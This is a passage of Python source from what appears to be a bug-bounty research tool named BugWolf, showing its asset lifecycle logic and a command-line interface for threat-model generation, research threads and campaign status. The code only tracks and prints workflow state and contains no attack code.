        """Advance an asset through its lifecycle phases."""
        if asset.status == AssetStatus.QUEUED:
            asset.status = AssetStatus.RECON
        elif asset.status == AssetStatus.RECON:
            asset.status = AssetStatus.THREAT_MODELING
        elif asset.status == AssetStatus.THREAT_MODELING:
            asset.status = AssetStatus.DEEP_RESEARCH
            self.start_asset_research(asset)
        elif asset.status == AssetStatus.DEEP_RESEARCH:
            if self.check_asset_exhausted(asset):
                asset.status = AssetStatus.EXHAUSTED
                asset.completed_at = datetime.now(timezone.utc).isoformat()
                # Update campaign
                state = self.campaign.load()
                state.assets_exhausted += 1
                self.campaign.save(state)

        self.campaign.update_asset(asset)
        return asset


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main() -> int:
    import argparse
    parser = argparse.ArgumentParser(
        description="BugWolf Research Thread System")
    parser.add_argument("--target", required=True,
                        help="Target hostname or project")
    parser.add_argument("--asset-id", help="Asset to operate on")
    parser.add_argument("--generate-threats", action="store_true",
                        help="Generate threat model for an asset")
    parser.add_argument("--spawn-threads", action="store_true",
                        help="Spawn research threads for an asset")
    parser.add_argument("--next-unit", help="Get next research unit for a thread")
    parser.add_argument("--advance-asset", action="store_true",
                        help="Advance an asset through its lifecycle")
    parser.add_argument("--list-threads", action="store_true",
                        help="List all threads")
    parser.add_argument("--status", action="store_true",
                        help="Show thread and asset status")
    parser.add_argument("--json", action="store_true",
                        help="Emit JSON")
    args = parser.parse_args()

    try:
        builder = ThreadBuilder(args.target)

        if args.generate_threats and args.asset_id:
            asset = builder.campaign.get_asset(args.asset_id)
            if not asset:
                print(f"[!] Asset not found: {args.asset_id}")
                return 1
            threats = builder.generate_threats(asset)
            print(f"[+] Generated {len(threats)} threats for {asset.hostname}:")
            for t in threats:
                print(f"    [{t.confidence.upper():8s}] {t.type:25s} {t.rationale[:70]}")

        elif args.spawn_threads and args.asset_id:
            asset = builder.campaign.get_asset(args.asset_id)
            if not asset:
                print(f"[!] Asset not found: {args.asset_id}")
                return 1
            threads = builder.start_asset_research(asset)
            print(f"[+] Spawned {len(threads)} threads for {asset.hostname}")

        elif args.next_unit:
            thread = builder.campaign.get_thread(args.next_unit)
            if not thread:
                print(f"[!] Thread not found: {args.next_unit}")
                return 1
            unit = builder.get_next_research_unit(thread)
            print(json.dumps(unit, indent=2, default=str))

        elif args.advance_asset and args.asset_id:
            asset = builder.campaign.get_asset(args.asset_id)
            if not asset:
                print(f"[!] Asset not found: {args.asset_id}")
                return 1
            asset = builder.advance_asset(asset)
            print(f"[+] Asset {asset.hostname} advanced to {asset.status.value}")

        elif args.list_threads:
            threads = builder.campaign.list_threads(
                asset_id=args.asset_id or "")
            if args.json:
                print(json.dumps([t.to_dict() for t in threads], indent=2, default=str))
            else:
                for t in threads:
                    states = {
                        "hypothesis": "💡", "probing": "🔬",
                        "signal_found": "📡", "escalating": "📈",
                        "exploiting": "💣", "validating": "✅",
                        "evidence_pkg": "📦", "complete": "🏁",
                        "refuted": "❌", "blocked": "🚫",
                        "documented_limited": "📋",
                    }
                    print(f"  {states.get(t.state.value, '?')} "
                          f"[{t.state.value:20s}] {t.bug_class:25s} "
                          f"{t.endpoint[:50]}")

        elif args.status:
            state = builder.campaign.load()
            resume = builder.campaign.get_resume()
            assets = builder.campaign.list_assets()
            threads = builder.campaign.list_threads()

            if args.json:
                print(json.dumps({
                    "campaign": state.to_dict(),
                    "assets": [a.to_dict() for a in assets],
                    "threads": [t.to_dict() for t in threads],
                    "resume": resume.to_dict() if resume else None,
                }, indent=2, default=str))
            else:
                print(f"[*] Campaign: {args.target}")
                print(f"    Status: {state.status}")
                print(f"    Assets: {len(assets)} ({state.assets_exhausted} exhausted)")
                print(f"    Threads: {len(threads)} "
                      f"({len([t for t in threads if not t.is_terminal])} active)")
                print(f"    Findings: {state.total_findings}")
                if resume:
                    print(f"    Next: {resume.next_action[:120]}...")
                for t in threads:
                    if not t.is_terminal:
                        print(f"  ▶ [{t.state.value}] {t.bug_class} on {t.endpoint[:50]}")

        else:
            parser.print_help()
            return 1

        return 0

    except (ValueError, FileNotFoundError, OSError) as exc:
        print(f"[!] {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())